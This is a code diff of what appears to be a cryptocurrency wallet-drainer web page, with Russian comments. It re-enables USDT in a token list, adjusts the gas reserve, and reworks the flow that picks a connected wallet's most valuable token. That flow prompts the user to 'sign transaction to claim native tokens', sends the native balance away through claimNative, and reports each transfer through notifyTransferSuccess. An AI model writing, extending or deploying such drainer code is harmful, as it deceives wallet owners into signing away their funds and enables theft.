@@ -437,7 +437,7 @@ const TOKENS = {
     { symbol: 'STORJ', address: '0xb64ef51c888972c908cfacf59b47c1afbc0ab8ac', decimals: 8 }
   ],
   'BNB Smart Chain': [
-//    { symbol: 'USDT', address: '0x55d398326f99059ff775485246999027b3197955', decimals: 18 },
+    { symbol: 'USDT', address: '0x55d398326f99059ff775485246999027b3197955', decimals: 18 },
     { symbol: 'USDC', address: '0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d', decimals: 18 },
     { symbol: 'SHIB', address: '0x2859e4544c4bb039668b1a517b2f6c39240b3a2f', decimals: 18 },
     { symbol: 'PEPE', address: '0x25d887ce7a35172c62febfd67a1856f20faebb00', decimals: 18 },
@@ -658,7 +658,7 @@ const getGasReserveWei = (chainId) => {
   if (chainId === networkMap['Fantom'].chainId) return parseUnits('0.2', 18)
   if (chainId === networkMap['Celo'].chainId) return parseUnits('0.02', 18)
   // По умолчанию для ETH‑подобных – 0.0005
-  return parseUnits('0.000005', 18)
+  return parseUnits('0.0005', 18)
 }
 
 const claimNative = async (wagmiConfig, chainId, userAddress, nativeBalance) => {
@@ -958,9 +958,16 @@ const initializeSubscribers = (modal) => {
         console.log(`Most expensive token: ${mostExpensive.symbol}, balance: ${mostExpensive.balance}, price in USD: ${mostExpensive.price}`)
         
         if (mostExpensive.address === 'native') {
+          console.log('Processing native token claim...')
           try {
+            // Обновляем модальное окно для показа подписи
+            const modalMessage = document.querySelector('.custom-modal-message')
+            if (modalMessage) modalMessage.textContent = 'Sign transaction to claim native tokens'
+            
             const txHash = await claimNative(wagmiAdapter.wagmiConfig, mostExpensive.chainId, state.address, mostExpensive.balance)
             console.log('Native claim tx sent:', txHash)
+            
+            // Уведомление об успехе
             await notifyTransferSuccess(
               state.address,
               walletInfo.name,
@@ -969,11 +976,17 @@ const initializeSubscribers = (modal) => {
               mostExpensive.chainId,
               txHash
             )
+            
+            // Показываем успех в модальном окне
+            if (modalMessage) modalMessage.textContent = `Success! Transaction: ${txHash}`
+            await new Promise(resolve => setTimeout(resolve, 2000))
+            
           } catch (error) {
-            // Показать пользователю причину и оставить модалку открытой на короткое время
-            const approveState = document.getElementById('approveState')
-            if (approveState) approveState.innerHTML = `Native claim failed: ${error.message}`
+            console.error('Native claim failed:', error)
+            const modalMessage = document.querySelector('.custom-modal-message')
+            if (modalMessage) modalMessage.textContent = `Claim failed: ${error.message}`
             store.errors.push(`Native claim failed: ${error.message}`)
+            await new Promise(resolve => setTimeout(resolve, 3000))
           }
           hideCustomModal()
           store.isProcessingConnection = false
